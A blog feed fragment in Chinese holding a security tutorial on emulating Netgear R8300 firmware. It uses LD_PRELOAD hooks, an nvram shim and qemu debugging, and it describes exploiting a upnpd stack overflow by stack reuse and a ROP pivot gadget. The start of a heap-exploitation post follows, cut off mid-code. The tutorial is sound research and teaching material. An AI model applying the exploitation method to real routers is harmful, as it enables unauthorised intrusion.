    <content type="html"><![CDATA[<h1 id="固件下的how2hook-how2patch"><a href="#固件下的how2hook-how2patch" class="headerlink" title="固件下的how2hook &amp; how2patch"></a>固件下的how2hook &amp; how2patch</h1><p>在模拟固件的时候通常需要我们自己对二进制文件进行patch和hook，但无论是patch还是hook，都是通过修改（劫持）二进制文件的执行流程来达到固件顺利启动的目的。</p><h2 id="BIN-100"><a href="#BIN-100" class="headerlink" title="BIN-100"></a>BIN-100</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(encoded_flag, &amp;byte_400A7E, <span class="built_in">sizeof</span>(encoded_flag));</span><br><span class="line">  stack_canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  data_pointer = obfuscated_key;</span><br><span class="line">  <span class="keyword">for</span> ( index_outer_loop = <span class="number">9LL</span>; index_outer_loop; --index_outer_loop )</span><br><span class="line">    *data_pointer++ = <span class="number">0</span>;</span><br><span class="line">  remaining_iterations = <span class="number">0x31337</span>;</span><br><span class="line">  initial_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">36</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      current_length = <span class="number">0LL</span>;</span><br><span class="line">      current_time = <span class="built_in">time</span>(<span class="number">0LL</span>);</span><br><span class="line">      <span class="built_in">srand</span>(<span class="number">0xDEFACED</span> - initial_time + current_time);</span><br><span class="line">      previous_byte = obfuscated_key[i];</span><br><span class="line">      obfuscated_key[i] = <span class="built_in">rand</span>() ^ previous_byte;</span><br><span class="line">      funny_element = (&amp;funny)[i];</span><br><span class="line">      <span class="keyword">while</span> ( current_length &lt; <span class="built_in">strlen</span>(funny_element) )</span><br><span class="line">      &#123;</span><br><span class="line">        character_value = funny_element[current_length];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)character_value == <span class="string">&#x27;i&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)current_length &amp;&amp; funny_element[current_length - <span class="number">1</span>] != <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">            ctype_function = __ctype_toupper_loc();</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            ctype_function = __ctype_tolower_loc();</span><br><span class="line">          formatted_string[(<span class="type">int</span>)current_length] = (*ctype_function)[character_value];</span><br><span class="line">        &#125;</span><br><span class="line">        ++current_length;</span><br><span class="line">      &#125;</span><br><span class="line">      formatted_string[(<span class="type">int</span>)current_length] = <span class="number">0</span>;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot; ♫ %80s ♫\n&quot;</span>, formatted_string);</span><br><span class="line">      <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    --remaining_iterations;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( remaining_iterations );</span><br><span class="line">  key_pointer = obfuscated_key;</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;KEY: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    byte_value = (<span class="type">unsigned</span> __int8)*key_pointer++;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%02x &quot;</span>, byte_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( key_pointer != encoded_flag );</span><br><span class="line">  flag_index = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;OK YOU WIN. HERE&#x27;S YOUR FLAG: &quot;</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    decoded_char = encoded_flag[flag_index] ^ obfuscated_key[flag_index];</span><br><span class="line">    ++flag_index;</span><br><span class="line">    <span class="built_in">putchar</span>(decoded_char);  <span class="comment">//输出flag</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( flag_index != <span class="number">36</span> );</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实我们发现这个demo的循环次数也算是比较少的，主要在于如何加快这个过程，发现有个sleep(1u)，那么我们可以利用LD_PRELOAD对sleep进行hook，然后nop掉一些无用的函数，如printf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; cat hook2.c</span><br><span class="line"><span class="comment">// gcc -shared -fPIC hook2.c -o hook2.so</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> t=<span class="number">0x31337</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">sleep</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> seconds)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    t++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">time</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=<span class="variable">$PWD</span>/hook2.so ./elf &gt;tmp</span><br><span class="line"><span class="built_in">tail</span> tmp</span><br></pre></td></tr></table></figure><p>得到flag：p4ul_1z_d34d_1z_wh4t_th3_r3c0rd_s4ys</p><h2 id="实战！"><a href="#实战！" class="headerlink" title="实战！"></a>实战！</h2><h3 id="PSV-2020-0211"><a href="#PSV-2020-0211" class="headerlink" title="PSV-2020-0211"></a>PSV-2020-0211</h3><p>netgear R8300 1.0.2.130 的upnp中存在栈溢出的漏洞，主要学习<strong>利用手法</strong>，NVram hook手法，Poc编写 以及 调试技巧</p><ul><li>**UPnP (Universal Plug and Play)**：现在由开放连接基金会管理的是一套网络协议，它允许网络设备无缝地发现彼此在网络上的存在，并为数据共享、通信和娱乐建立功能网络服务。</li></ul><p>UPnP会将某个端口连接到<strong>多播组</strong>，即允许接收其他客户端传输数据（一对多）【或许就是通过这个来使得网络设备可以无缝发现彼此扒】</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630751.png" alt="image-20250228222327229"></p><p>漏洞看着是很简单的，但是由于sub_25E04是通过strcpy来栈溢出的，因此\x00截断便是不可绕过的障碍，而原作者的利用手法值得学习</p><p>启动服务：这次使用用户模式运行</p><p>因为涉及到nvram，使用LD_PRELOAD Hook技术，网上有人已经写好了针对netgear R6250&#x2F;6400的nvram hook，对于R8300也是适用的 <a href="https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c">https://github.com/therealsaumil/custom_nvram/blob/master/custom_nvram_r6250.c</a></p><p>使用buildroot进行交叉编译</p><p>首先构造buildroot</p><p>下载地址: <a href="https://buildroot.org/download.html%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AA%E6%9C%80%E6%96%B0%E7%9A%84%E7%89%88%E6%9C%AC">https://buildroot.org/download.html，下载一个最新的版本</a></p><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot-2024.11</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>Target Option -&gt; Target Archite… -&gt; Arm little endian</p><p>之后file随便一个nvram的文件，发现是uClibc</p><p>因此toolchain-&gt;C library-&gt;uClibc</p><p>但是在编译之前需要先换源，这样可以节省一大堆的时间</p><p>Build Option -&gt; Mirrors and Download locations -&gt; </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//sources.buildroot.net                              </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/linux-kernel</span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/gnu </span></span><br><span class="line">https:<span class="comment">//luarocks.cn                         </span></span><br><span class="line">https:<span class="comment">//mirrors.aliyun.com/CPAN</span></span><br></pre></td></tr></table></figure><p>之后多次esc退出，然后执行<code>make toolchain -j4 V=0</code></p><ol><li><strong>images&#x2F;</strong>  <ul><li>存放编译后生成的所有镜像文件，包括内核镜像、加载引导镜像和根文件系统镜像。</li><li>这些镜像用于在目标设备上启动和运行操作系统。</li></ul></li><li><strong>build&#x2F;</strong>  <ul><li>存放所有构建组件的目录，除了交叉编译工具链的组件。</li><li>每个功能对应一个子目录，包含该功能所需的所有组件。</li><li>例如，内核、库、应用程序等在这里进行编译和配置。</li></ul></li><li><strong>staging&#x2F;</strong>  <ul><li>包含一个类似于根文件系统的层次结构。</li><li>这个目录包含已安装的交叉编译工具链和所有为目标板选择的用户空间包。</li><li>用于准备最终的根文件系统。</li></ul></li><li><strong>target&#x2F;</strong>  <ul><li>包含根文件系统的完整结构，但不能直接用于开发板。</li><li>这个目录是构建过程中生成的文件系统的中间状态。</li></ul></li><li><strong>host&#x2F;</strong>  <ul><li>包含构建过程中需要的交叉编译工具集。</li><li>用于在主机系统上编译目标系统的代码。</li><li>提供了编译器、链接器和其他必要的开发工具。</li></ul></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/buildroot<span class="number">-2024.11</span>/output/host/bin </span><br><span class="line"><span class="keyword">export</span> PATH=$PATH:$(pwd)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gcc -c -O2 -fPIC -Wall ./nvram1.c -o ./nvram1.o</span><br><span class="line">arm-linux-gcc -shared -nostdlib  ./nvram1.o -o ./nvram1.so</span><br></pre></td></tr></table></figure><p>之后创建&#x2F;tmp&#x2F;nvram.ini</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">upnpd_debug_level</span>=<span class="number">9</span></span><br><span class="line"><span class="attr">lan_ipaddr</span>=<span class="number">192.168</span>.<span class="number">122.167</span></span><br><span class="line"><span class="attr">hwver</span>=R8500</span><br><span class="line"><span class="attr">friendly_name</span>=R8300</span><br><span class="line"><span class="attr">upnp_enable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_turn_on</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_advert_period</span>=<span class="number">30</span></span><br><span class="line"><span class="attr">upnp_advert_ttl</span>=<span class="number">4</span></span><br><span class="line"><span class="attr">upnp_portmap_entry</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">upnp_duration</span>=<span class="number">3600</span></span><br><span class="line"><span class="attr">upnp_DHCPServerConfigurable</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">wps_is_upnp</span>=<span class="number">0</span></span><br><span class="line"><span class="attr">upnp_sa_uuid</span>=<span class="number">00000000000000000000</span></span><br><span class="line"><span class="attr">lan_hwaddr</span>=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><p>之后的lan_ipaddr还要连接，因此要把ip起起来</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ip addr add 192.168.122.167/24 dev virbr0</span><br><span class="line">ip addr show virbr0</span><br></pre></td></tr></table></figure><p>显示对应的ip就代表成功啦</p><p>之后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-static -E LD_PRELOAD=&quot;./nvram1.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo lsof -i | grep qemu                                                                     </span><br><span class="line">qemu-arm- 6267            root    3u  IPv4  93141      0t0  UDP *:1900 </span><br><span class="line">qemu-arm- 6267            root    4u  IPv4  93142      0t0  UDP *:45791 </span><br><span class="line">qemu-arm- 6267            root    5u  IPv4  93143      0t0  TCP *:5000 (LISTEN)</span><br></pre></td></tr></table></figure><p>如此程序就起起来了，就可以开始Poc的编写了</p><p>调试：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-arm-<span class="type">static</span> -g <span class="number">1234</span> -E LD_PRELOAD=<span class="string">&quot;./nvram1.so ./lib/libdl.so.0&quot;</span> ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><blockquote><p>一开始傻呗了，忘记了用户模式可以直接调试，直接attach pid调试调的是qemu的进程（）</p></blockquote><p>main函数中有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">daemon</span>(<span class="number">1</span>, <span class="number">1</span>) == <span class="number">-1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">debug</span>(<span class="number">3</span>, <span class="string">&quot;Fail to run as daemon&quot;</span>);</span><br><span class="line">  v13 = _errno_location();</span><br><span class="line">  <span class="built_in">exit</span>(*v13);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>daemon使得当前进程会变成守护进程并保持工作目录不变，但是这个会让该进程脱离gdb的控制，考虑nop掉，成功~</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> R0   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R1   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R2   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R3   <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R4   <span class="number">0x61</span></span><br><span class="line"> R5   <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R6   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R7   <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R8   <span class="number">0xfffed504</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> R9   <span class="number">0x10ab</span></span><br><span class="line"> R10  <span class="number">0x1</span></span><br><span class="line"> R11  <span class="number">0xc4584</span> ◂— <span class="number">7</span></span><br><span class="line"> R12  <span class="number">0x553dc</span> —▸ <span class="number">0xff60393c</span> ◂— push &#123;r4, lr&#125; <span class="comment">/* 0xe92d4010 */</span></span><br><span class="line"> SP   <span class="number">0xfffeceb8</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"> PC   <span class="number">0xff603954</span> ◂— ldrb ip, [r3] <span class="comment">/* 0xe5d3c000 */</span></span><br><span class="line">──────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]──────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line"> ► <span class="number">0xff603954</span>    ldrb   ip, [r3]</span><br><span class="line">   <span class="number">0xff603958</span>    cmp    r4, ip</span><br><span class="line">   <span class="number">0xff60395c</span>    addeq  r2, r2, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603960</span>    addeq  r3, r3, #<span class="number">1</span></span><br><span class="line">   <span class="number">0xff603964</span>    beq    #<span class="number">0xff603948</span>                   &lt;<span class="number">0xff603948</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0xff603948</span>    ldrb   r4, [r2]</span><br><span class="line">   <span class="number">0xff60394c</span>    cmp    r4, #<span class="number">0</span></span><br><span class="line">   <span class="number">0xff603950</span>    popeq  &#123;r4, pc&#125;</span><br><span class="line">──────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ sp <span class="number">0xfffeceb8</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│    <span class="number">0xfffecebc</span> —▸ <span class="number">0xb62c</span> ◂— subs r7, r0, #<span class="number">0</span> <span class="comment">/* 0xe2507000 */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│    <span class="number">0xfffecec0</span> —▸ <span class="number">0xfffedefd</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>c│    <span class="number">0xfffecec4</span> —▸ <span class="number">0xfffed574</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│    <span class="number">0xfffecec8</span> —▸ <span class="number">0x8df9</span> ◂— <span class="number">0xad</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0014</span>│    <span class="number">0xfffececc</span> —▸ <span class="number">0xfffef5f4</span> ◂— mrchs p9, #<span class="number">1</span>, r3, c2, c1, #<span class="number">1</span> <span class="comment">/* 0x2e323931; &#x27;192.168.122.1&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│    <span class="number">0xfffeced0</span> —▸ <span class="number">0xfffed500</span> ◂— <span class="number">0x61616161</span> (<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">001</span>c│    <span class="number">0xfffeced4</span> —▸ <span class="number">0x25e80</span> ◂— subs sl, r0, #<span class="number">0</span> <span class="comment">/* 0xe250a000 */</span></span><br><span class="line">────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span> <span class="number">0xff603954</span></span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>发送大量数据就成功发现栈溢出漏洞</p><p>漏洞利用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frimware/_R8300-V1<span class="number">.0</span><span class="number">.2</span><span class="number">.130</span>_1<span class="number">.0</span><span class="number">.99</span>.chk.extracted/squashfs-root </span><br><span class="line">&gt; checksec ./usr/sbin/upnpd     </span><br><span class="line">[*] <span class="string">&#x27;/home/s1nec-1o/frimware/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/usr/sbin/upnpd&#x27;</span></span><br><span class="line">    Arch:     arm<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8000</span>)</span></span></span><br></pre></td></tr></table></figure><p>没pie，就启用了nx</p><p><code>SSD</code> 公开的<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">漏洞细节</a>中给出了一个方案：通过 <code>stack reuse</code> 的方式来绕过该限制。具体思路为，先通过 <code>socket</code> 发送第一次数据，往栈上填充相应的 <code>rop payload</code>，同时保证不会造成程序崩溃；再通过 <code>socket</code> 发送第二次数据用于覆盖栈上的返回地址，填充的返回地址用来实现 <code>stack pivot</code>，即劫持栈指针使其指向第一次发送的 <code>payload</code> 处，然后再复用之前的 <code>payload</code> 以完成漏洞利用。<code>SSD</code> 公开的漏洞细节中的示意图如下。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503031630752.png" alt="image-20250301114232391" style="zoom:50%;" /><p>这里借用的ROP有</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000230F</span>0                 ADD             SP, SP, #<span class="number">0x20C</span></span><br><span class="line">.text:<span class="number">000230F</span>4                 ADD             SP, SP, #<span class="number">0x1000</span></span><br><span class="line">.text:<span class="number">000230F</span>8                 POP             &#123;R4-R11,PC&#125;</span><br></pre></td></tr></table></figure><p>升栈并且pop出所有关键寄存器，如此只需要提前构造好对应的payload就可以进行ROP啦！</p><p>这个利用的手法使得一些简单的栈溢出都能变得很危险（学到惹）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.iotsec-zone.com/article/202">cyberangle</a></p><p><a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">原作者</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;固件下的how2hook-how2patch&quot;&gt;&lt;a href=&quot;#固件下的how2hook-how2patch&quot; class=&quot;headerlink&quot; title=&quot;固件下的how2hook &amp;amp; how2patch&quot;&gt;&lt;/a&gt;固件下的how2hook &amp;</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>how2heap</title>
    <link href="http://s1nec-1o.github.io/2025/02/21/how2heap/"/>
    <id>http://s1nec-1o.github.io/2025/02/21/how2heap/</id>
    <published>2025-02-21T12:41:20.000Z</published>
    <updated>2025-02-21T12:52:11.452Z</updated>
    
    <content type="html"><![CDATA[<h1 id="house-of手法"><a href="#house-of手法" class="headerlink" title="house of手法"></a>house of手法</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>house of的手法只需理解其中的技巧，了解如何从小小的漏洞获得rce</p><h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house of einherjar"></a>house of einherjar</h2><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>溢出写、<code>off by one</code>、<code>off by null</code></p><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可分配大于处于 <code>unsortedbin</code> 的 <code>chunk</code></li></ul><h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用 <code>off by null</code> 修改掉 <code>chunk</code> 的 <code>size</code> 域的 <code>P</code> 位，绕过 <code>unlink</code> 检查，在堆的后向合并过程中构造出 <code>chunk overlapping</code>。</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code>，<code>chunk D</code> 用来做 <code>gap</code>，<code>chunk A、chunk C</code> 都要处于 <code>unsortedbin</code> 范围</li><li>释放 <code>A</code>，进入 <code>unsortedbin</code></li><li>对 <code>B</code> 写操作的时候存在 <code>off by null</code>，修改了 <code>C</code> 的 <code>P</code> 位</li><li>释放 <code>C</code> 的时候，堆后向合并，直接把 <code>A、B、C</code> 三块内存合并为了一个 <code>chunk</code>，并放到了 <code>unsortedbin</code> 里面</li><li>读写合并后的大 <code>chunk</code> 可以操作 <code>chunk B</code> 的内容，<code>chunk B</code> 的头</li></ul><h3 id="相关技巧"><a href="#相关技巧" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>虽然该利用技巧至今仍可以利用，但是需要对 <code>unlink</code> 绕过的条件随着版本的增加有所变化。</p><p>最开始的 <code>unlink</code> 的代码是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta"><span class="comment">// .....      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;      \</span></span></span><br><span class="line"><span 